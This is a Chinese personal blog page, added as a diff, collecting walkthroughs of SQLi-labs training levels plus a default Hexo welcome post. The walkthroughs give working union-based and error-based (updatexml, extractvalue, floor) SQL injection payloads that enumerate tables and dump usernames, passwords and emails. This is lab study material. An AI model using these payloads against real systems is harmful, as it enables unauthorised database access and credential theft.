@@ -1,0 +1,177 @@
+<!DOCTYPE html><html lang="zh-CN"><head><meta charset="UTF-8"><meta http-equiv="X-UA-Compatible" content="IE=edge"><meta name="viewport" content="width=device-width, initial-scale=1"><meta name="format-detection" content="telephone=no"><meta name="apple-mobile-web-app-capable" content="yes"><meta name="apple-mobile-web-app-status-bar-style" content="black"><link rel="icon" href="/images/icons/favicon-16x16.png?v=2.6.2" type="image/png" sizes="16x16"><link rel="icon" href="/images/icons/favicon-32x32.png?v=2.6.2" type="image/png" sizes="32x32"><meta property="og:type" content="website">
+<meta property="og:title" content="佳木禾">
+<meta property="og:url" content="http://jiamuhe.github.io/page/3/index.html">
+<meta property="og:site_name" content="佳木禾">
+<meta property="og:locale" content="zh_CN">
+<meta property="article:author" content="jiamuhe">
+<meta name="twitter:card" content="summary"><title>佳木禾</title><link ref="canonical" href="http://jiamuhe.github.io/page/3/index.html"><link rel="dns-prefetch" href="https://cdn.jsdelivr.net"><link rel="stylesheet" href="https://cdn.jsdelivr.net/npm/@fortawesome/fontawesome-free@5.12.1/css/all.min.css" type="text/css"><link rel="stylesheet" href="/css/index.css?v=2.6.2"><script>var Stun = window.Stun || {};
+var CONFIG = {
+  root: '/',
+  algolia: undefined,
+  assistSearch: undefined,
+  fontIcon: {"prompt":{"success":"fas fa-check-circle","info":"fas fa-arrow-circle-right","warning":"fas fa-exclamation-circle","error":"fas fa-times-circle"},"copyBtn":"fas fa-copy"},
+  sidebar: {"offsetTop":"20px","tocMaxDepth":6},
+  header: {"enable":true,"showOnPost":true,"scrollDownIcon":false},
+  postWidget: {"endText":true},
+  nightMode: {"enable":true},
+  back2top: {"enable":true},
+  codeblock: {"style":"default","highlight":"light","wordWrap":false},
+  reward: false,
+  fancybox: false,
+  zoomImage: {"gapAside":"20px"},
+  galleryWaterfall: undefined,
+  lazyload: false,
+  pjax: undefined,
+  externalLink: {"icon":{"enable":true,"name":"fas fa-external-link-alt"}},
+  shortcuts: undefined,
+  prompt: {"copyButton":"复制","copySuccess":"复制成功","copyError":"复制失败"},
+  sourcePath: {"js":"js","css":"css","images":"images"},
+};
+
+window.CONFIG = CONFIG;</script><meta name="generator" content="Hexo 6.1.0"></head><body><div class="container" id="container"><header class="header" id="header"><div class="header-inner"><nav class="header-nav header-nav--fixed"><div class="header-nav-inner"><div class="header-nav-menubtn"><i class="fas fa-bars"></i></div><div class="header-nav-menu"><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/"><span class="header-nav-menu-item__icon"><i class="fas fa-home"></i></span><span class="header-nav-menu-item__text">首页</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/archives/"><span class="header-nav-menu-item__icon"><i class="fas fa-folder-open"></i></span><span class="header-nav-menu-item__text">归档</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/categories/"><span class="header-nav-menu-item__icon"><i class="fas fa-layer-group"></i></span><span class="header-nav-menu-item__text">分类</span></a></div><div class="header-nav-menu-item"><a class="header-nav-menu-item__link" href="/tags/"><span class="header-nav-menu-item__icon"><i class="fas fa-tags"></i></span><span class="header-nav-menu-item__text">标签</span></a></div></div><div class="header-nav-mode"><div class="mode"><div class="mode-track"><span class="mode-track-moon"></span><span class="mode-track-sun"></span></div><div class="mode-thumb"></div></div></div></div></nav><div class="header-banner"><div class="header-banner-info"><div class="header-banner-info__title">佳木禾</div><div class="header-banner-info__subtitle">欢迎来到我的博客</div></div></div></div></header><main class="main" id="main"><div class="main-inner"><div class="content-wrap" id="content-wrap"><div class="content content-home" id="content"><section class="postlist"><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-5/">SQLI-DUMB-SERIES-5</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>这是第一个正经的报错注入..</p>
+<p>首先我们还是先找注入点，闭合方式是‘</p>
+<p><img src="/picture/5.1.jpg"></p>
+<p>我们先利用报错注入找出数据库名</p>
+<p><img src="/picture/5.2.jpg"></p>
+<p>我们写入?id&#x3D;1’ and (updatexml(1,concat(1,(select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1)),0x7e))%23</p>
+<p>得出数据表名，通过修改limit 0，1中的0，爆出所有表名</p>
+<p><img src="/picture/5.3.jpg"></p>
+<p>?id&#x3D;1’ and (updatexml(1,concat(1,(select column_name from information_schema.columns where table_name&#x3D;’users’ limit 0,1)),0x7e))%23</p>
+<p>通过更改limit 0,1得出users表中的所有列名</p>
+<p>image-20220328224021093</p>
+<p>我们得出，共有三列：id，username，password</p>
+<p>?id&#x3D;1’ and (updatexml(1,concat(1,(select username from users where id&#x3D;’1’)),0x7e))%23得出第一个username</p>
+<p><img src="/picture/5.4.jpg"></p>
+<p>?id&#x3D;1’ and (updatexml(1,concat(1,(select password from users where id&#x3D;’1’)),0x7e))%23得出与之对应的第一个password</p>
+<p><img src="/picture/5.5.jpg"></p>
+<p>慢慢更改id然后重复上面的步骤就行了，也可以不用id，通过limit控制输出</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/04/01/SQLI-DUMB-SERIES-4/">SQLI-DUMB-SERIES-4</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-04-01</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-04-01</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>首先先找注入点，在id&#x3D;1后加’无任何反应，我们尝试加”，报错。可得出闭合为”)</p>
+<p><img src="/picture/3.1.jpg"></p>
+<p>接下来联合注入，简单快捷。具体内容参考SERIES1</p>
+<p><img src="/picture/3.2.jpg"></p>
+<p>j经过操作发现有三列</p>
+<p>然后我们查出数据库名字和版本</p>
+<p><img src="/picture/3.3.jpg"></p>
+<p>爆出表名</p>
+<p><img src="/picture/3.4.jpg"></p>
+<p>爆出users的列名</p>
+<p><img src="/picture/3.5.png"></p>
+<p>爆出username</p>
+<p><img src="/picture/3.6.png"></p>
+<p>爆出password</p>
+<p><img src="/picture/3.7.png"></p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/25/SERIES-3/">SERIES-3</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-25</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>好的，我们来到第三关</p>
+<p>由于那两个xpath报错注入的语法没啥太大区别，所以本题我们采用floor报错注入</p>
+<p>首先我们要深入了解一下floor注入的原理<span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://www.freebuf.com/column/235496.html%E6%9B%B4%E6%96%B9%E4%BE%BF%E7%90%86%E8%A7%A3" >https://www.freebuf.com/column/235496.html更方便理解</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+<p>首先还是id&#x3D;1，然后再输入id&#x3D;1‘</p>
+<p>我们发现这次的报错有不一样，他有好多的引号，然后还有括号</p>
+<p>我们这次把他拆的更细一些，near ’‘1’‘）LIMIT0，1’在这里near没用看这个’‘1’‘）LIMIT0，1’后面这个limit 0，1他也没用就是从零开始输出一个，然后就剩了</p>
+<p>‘1’’)从这个我们就可以分析出来他的格式了。很明显右边多一个’那么正确的格式就是**’id’)**所以我们通过’)进行闭合</p>
+<p>img</p>
+<p>我们输入id&#x3D;1’) and (select 1 from (select count(*),concat(database(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23查询出数据库的名称</p>
+<p>img</p>
+<p>然后查版本?id&#x3D;1’) and (select 1 from (select count(*),concat(version(),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>接下来查表名就稍微有改变了，因为这个方法他每次只能显示出一组数据，所以我们需要加上 limit n，1</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 1,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 3,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select table_name from information_schema.tables where table_schema&#x3D;database() limit 4,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>当我们到4的时候，他就没报错返回了，所以他只有4个表：emails、referers、uagents、users</p>
+<p>img</p>
+<p>接下来又到了无聊的抽取一个幸运表报数据了</p>
+<p>这次选择referers表，首先需要爆出列名 id ip_address</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;’referers’ limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>?id&#x3D;1’) and (select 1 from (select count(*),concat((select column_name from information_schema.columns where table_name&#x3D;’referers’ limit 2,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>最后只有三列：id、referer1、ip_address</p>
+<p>但好像很倒霉，这个表里面居然没数据</p>
+<p>换一个users表 经过和上面一样的爆表工作，我们发现也有三列：id,username,password</p>
+<p>我们输入?id&#x3D;1’) and (select 1 from (select count(*),concat((select concat(0x3c,id,0x3a,username,0x3a,password,0x3e) from users limit 0,1),floor(rand(0)*2))x from information_schema.tables group by x)a)%23</p>
+<p>img</p>
+<p>爆出了第一组数据，接下里只需要更改 limit 后的值就可以搞出所有的数据</p>
+<p>😪经过吃饱了撑的遍历之后，他居然有12，14但是没用13？？？啊？？？ψ(._. )&gt;）</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/25/SERIES-2/">SERIES-2</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-25</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>id&#x3D;’and(select updatexml(“anything”,concat(‘~’,(select语句())),”anything”)) 第一个anything最好还是输入一些正常的东西吧，输入数字的话会被吞掉。当后面是数字的话，后面查询的内容也会被吞</p>
+<p>这是报错注入中updatexml函数的模板句 extractvalue语法与其用法几乎一模一样</p>
+<p>虽然本题具有回显的位置，但选择了报错注入的方法。</p>
+<p>首先也是输入i?d&#x3D;1进行判断发现页面发生变化，表示可注入（和上一个一样，所有就不截图了）</p>
+<p>接下来我们输入?id&#x3D;1’会发现报错 near ‘’，说明他的那个语句里什么都没有，就是单单的接受了我们注入的语句所以‘是有问题的</p>
+<p>img</p>
+<p>那么它既然是直接接受不做任何处理，我们也就什么也不用加了，乐意的话加上#也行，没影响</p>
+<p>既然我们选择了报错注入那么就没有必要去找什么列数了。</p>
+<p>直接输入?id&#x3D;1 and (updatexml(1,concat(1,(select database())),1))，直接就爆出了数据库名称</p>
+<p>img</p>
+<p>接下来输入?id&#x3D;1 and (updatexml(1,concat(1,(select group_concat(table_name) from information_schema.tables where table_schema&#x3D;database())),1))</p>
+<p>爆出数据库里的表名</p>
+<p>img</p>
+<p>接下来输入?id&#x3D;1 and (updatexml(1,concat(1,(select group_concat(column_name) from information_schema.columns where table_name&#x3D;’emails’)),1))</p>
+<p>爆出emails表中的列名</p>
+<p>img</p>
+<p>接下来输入?id&#x3D;1 and (updatexml(1,concat(0x7e,(select group_concat(id,0x3a,email_id,0x7e) from emails )),1))爆出emails表中的内容，但由于位数限制我们只能爆出前两个</p>
+<p>img</p>
+<p>这时我们在后面添上查询条件where id not in(1)就可以不看id为1的数据，他就会显示2、3的数据了</p>
+<p>?id&#x3D;1 and (updatexml(1,concat(0x3e,(select group_concat(id,0x3a,email_id,0x7e) from emails where id not in(1) )),1))</p>
+<p>img</p>
+<p>老样子，接下来换一下表换一下搜索的东西就能爆出所有表的内容了</p>
+<p>≡(▔﹏▔)≡</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/25/SERIES-1/">SERIES-1</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-25</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-25</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>首先我们再url后面 添加?id&#x3D;1 ,发现页面变化且正常显示，说明我们输入的语句是可以被接受到的</p>
+<p>img</p>
+<p>我们再次输入?id&#x3D;1’ 发现出现报错，说明‘是没有被过滤掉的。且这个属于一个用’的字符型注入。就可以理解成，他让你输入的位置是‘内容’这个样子的，所以输入1的时候是正确的，但如果多输入一个‘它后面就会多出来一个’所以报错了。 如果在后面再加#就可以注释掉系统后面的代码，就又正常了。</p>
+<p>img</p>
+<p>当我们输入?id&#x3D;1’ and 1&#x3D;2%23 时，会发现回显错误。就说明我们的1&#x3D;2是已经注入进去了，因为很明显不对所以没用回显。或者也可输入?id&#x3D;1’and ‘1’&#x3D;’2可得出相同的结果。</p>
+<p>img![img](h</p>
+<p>接下来我们开始利用order by来分析就是前面这个id的表里面有几列。因为，在联合查询的时候，两个表的列数必须一样不然会报错，</p>
+<p>如果当你后面表列数不足的话，可以随便填一个值补上那一列</p>
+<p>img</p>
+<p>然后我们利用?id&#x3D;-1’ union select 1,2,3%23 确认回显的位置(因为上面order by时到四不行了，所以前面这个表只有三行 )</p>
+<p>同时说明，如果select一个数的话，他是会直接把数显出来的，正好验证了上面所说的列数不够时随便用数凑。</p>
+<p>还有这里为什么是-1，其实只要是它实际id里没有的就行，不然第一个id就回显了。后面的select没地方显示了。-1的意义就是想办法把他弄到搜不到内容</p>
+<p>比如在?id&#x3D;1’后面接and 1&#x3D;2也是同样效果</p>
+<p>img</p>
+<p>我们已经找到了 2，3的地方可以显示数据。所以我们用这两个位置查询一下数据库的名称以及版本。我们可以根据版本选择接下来的注入方式。</p>
+<p>img</p>
+<p>接下来爆表名，?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(table_name) from information_schema.tables where table_schema&#x3D;database()<br>– 奥特光线&gt;—~~~~~~~~</p>
+<p>img</p>
+<p>接下里爆列名，只要我们再拿到列名，我们就可以随便查看表里内容了。</p>
+<p>这里小偷一波懒，直接选择查看users表的信息，直接爆出users表的列名</p>
+<p>?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(column_name) from information_schema.columns where table_name&#x3D;’users’<br>– QaQ&gt;_&lt;</p>
+<p>img</p>
+<p>接下来我们就可以爆出users表中的所有信息了</p>
+<p>?id&#x3D;1%27%20and%201&#x3D;2%20union select 1,2,group_concat(id,0x3a,username,0x3a,password,0x7e) from users<br>– ．&lt;{&#x3D;．．．．（嘎嘎嘎~）</p>
+<p>img</p>
+<p>只要重复上面的几步，爆出其他表的列名就可以爆出所有表的内容了</p>
+</div></div></article><article class="postlist-item post"><header class="post-header"><h1 class="post-title"><a class="post-title__link" href="/2022/03/14/hello-world/">Hello World</a></h1><div class="post-meta"><span class="post-meta-item post-meta-item--createtime"><span class="post-meta-item__icon"><i class="far fa-calendar-plus"></i></span><span class="post-meta-item__info">发表于</span><span class="post-meta-item__value">2022-03-14</span></span><span class="post-meta-item post-meta-item--updatetime"><span class="post-meta-item__icon"><i class="far fa-calendar-check"></i></span><span class="post-meta-item__info">更新于</span><span class="post-meta-item__value">2022-03-25</span></span></div></header><div class="post-body"><div class="post-excerpt"><p>Welcome to <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/" >Hexo</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>! This is your very first post. Check <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/" >documentation</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> for more info. If you get any problems when using Hexo, you can find the answer in <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/troubleshooting.html" >troubleshooting</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span> or you can ask me on <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://github.com/hexojs/hexo/issues" >GitHub</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span>.</p>
+
+        <h2 id="Quick-Start"   >
+          <a href="#Quick-Start" class="heading-link"><i class="fas fa-link"></i></a><a href="#Quick-Start" class="headerlink" title="Quick Start"></a>Quick Start</h2>
+      
+        <h3 id="Create-a-new-post"   >
+          <a href="#Create-a-new-post" class="heading-link"><i class="fas fa-link"></i></a><a href="#Create-a-new-post" class="headerlink" title="Create a new post"></a>Create a new post</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo new <span class="string">&quot;My New Post&quot;</span></span><br></pre></td></tr></table></div></figure>
+
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/writing.html" >Writing</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="Run-server"   >
+          <a href="#Run-server" class="heading-link"><i class="fas fa-link"></i></a><a href="#Run-server" class="headerlink" title="Run server"></a>Run server</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo server</span><br></pre></td></tr></table></div></figure>
+
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/server.html" >Server</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="Generate-static-files"   >
+          <a href="#Generate-static-files" class="heading-link"><i class="fas fa-link"></i></a><a href="#Generate-static-files" class="headerlink" title="Generate static files"></a>Generate static files</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo generate</span><br></pre></td></tr></table></div></figure>
+
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/generating.html" >Generating</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+
+        <h3 id="Deploy-to-remote-sites"   >
+          <a href="#Deploy-to-remote-sites" class="heading-link"><i class="fas fa-link"></i></a><a href="#Deploy-to-remote-sites" class="headerlink" title="Deploy to remote sites"></a>Deploy to remote sites</h3>
+      <figure class="highlight bash"><div class="table-container"><table><tr><td class="gutter"><pre><span class="line">1</span><br></pre></td><td class="code"><pre><span class="line">$ hexo deploy</span><br></pre></td></tr></table></div></figure>
+
+<p>More info: <span class="exturl"><a class="exturl__link"   target="_blank" rel="noopener" href="https://hexo.io/docs/one-command-deployment.html" >Deployment</a><span class="exturl__icon"><i class="fas fa-external-link-alt"></i></span></span></p>
+</div></div></article></section><nav class="paginator"><div class="paginator-inner"><a class="extend prev" rel="prev" href="/page/2/"><i class="fas fa-angle-left"></i></a><a class="page-number" href="/">1</a><a class="page-number" href="/page/2/">2</a><span class="page-number current">3</span></div></nav></div></div><div class="sidebar-wrap" id="sidebar-wrap"><aside class="sidebar" id="sidebar"><section class="sidebar-toc hide"></section><!-- ov = overview--><section class="sidebar-ov"><div class="sidebar-ov-author"><div class="sidebar-ov-author__avatar"><img class="sidebar-ov-author__avatar_img" src="/picture/dog.jpg" alt="avatar"></div><p class="sidebar-ov-author__text">该狗还得狗</p></div><div class="sidebar-ov-state"><a class="sidebar-ov-state-item sidebar-ov-state-item--posts" href="/archives/"><div class="sidebar-ov-state-item__count">26</div><div class="sidebar-ov-state-item__name">归档</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--categories" href="/categories/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">分类</div></a><a class="sidebar-ov-state-item sidebar-ov-state-item--tags" href="/tags/"><div class="sidebar-ov-state-item__count">2</div><div class="sidebar-ov-state-item__name">标签</div></a></div><div class="sidebar-ov-cc"><a href="https://creativecommons.org/licenses/by-nc-sa/4.0/deed.en" target="_blank" rel="noopener" data-popover="知识共享许可协议" data-popover-pos="up"><img src="/images/cc-by-nc-sa.svg"></a></div></section></aside></div><div class="clearfix"></div></div></main><footer class="footer" id="footer"><div class="footer-inner"><div><span>Copyright © 2022</span><span class="footer__icon"><i class="fas fa-heart"></i></span><span>jiamuhe</span></div></div></footer><div class="loading-bar" id="loading-bar"><div class="loading-bar__progress"></div></div><div class="back2top" id="back2top"><span class="back2top__icon"><i class="fas fa-rocket"></i></span></div></div><script src="https://cdn.jsdelivr.net/npm/jquery@v3.4.1/dist/jquery.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.min.js"></script><script src="https://cdn.jsdelivr.net/npm/velocity-animate@1.5.2/velocity.ui.min.js"></script><script src="/js/utils.js?v=2.6.2"></script><script src="/js/stun-boot.js?v=2.6.2"></script><script src="/js/scroll.js?v=2.6.2"></script><script src="/js/header.js?v=2.6.2"></script><script src="/js/sidebar.js?v=2.6.2"></script></body></html>
